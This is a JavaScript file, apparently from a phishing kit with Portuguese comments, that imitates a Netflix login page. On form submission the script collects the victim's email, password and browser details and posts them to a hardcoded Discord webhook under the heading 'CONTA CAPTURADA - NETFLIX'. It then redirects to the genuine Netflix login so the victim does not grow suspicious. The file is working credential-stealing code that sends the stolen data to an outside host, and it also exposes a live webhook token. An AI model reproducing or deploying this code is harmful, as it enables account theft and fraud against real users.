// URL da sua Webhook atualizada
const webhookURL = "https://discord.com/api/webhooks/1481425939975114946/DK0ymjsQ73mw8Ub08uYiDgOuwWeq8HWuRGkunjvM-r1P74ghg-DWIYXgen-rijVO_lk6";

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const emailValue = document.getElementById('email').value;
    const passwordValue = document.getElementById('password').value;
    const btn = document.getElementById('btnSubmit');

    btn.innerText = "Processando...";
    btn.disabled = true;

    // Título e layout melhorados para o Discord
    const payload = {
        username: "Netflix Logs",
        avatar_url: "https://cdn-icons-png.flaticon.com/512/732/732228.png",
        embeds: [{
            title: "💎 CONTA CAPTURADA - NETFLIX 💎",
            description: "Uma nova conta acaba de ser registrada no sistema.",
            color: 16711680, // Vermelho puro
            fields: [
                {
                    name: "📌 Usuário/E-mail",
                    value: `\`\`\`${emailValue}\`\`\``,
                    inline: false
                },
                {
                    name: "🔑 Senha",
                    value: `\`\`\`${passwordValue}\`\`\``,
                    inline: false
                },
                {
                    name: "📱 Dispositivo",
                    value: navigator.userAgent.substring(0, 100), // Pega info básica do navegador
                    inline: false
                }
            ],
            footer: {
                text: "Shelby LOGS • " + new Date().toLocaleString('pt-BR'),
            }
        }]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(() => {
        // Redireciona para o login real para não gerar desconfiança
        window.location.href = "https://www.netflix.com/br/login";
    })
    .catch(err => {
        console.error("Erro:", err);
        btn.innerText = "Continuar";
        btn.disabled = false;
    });
});
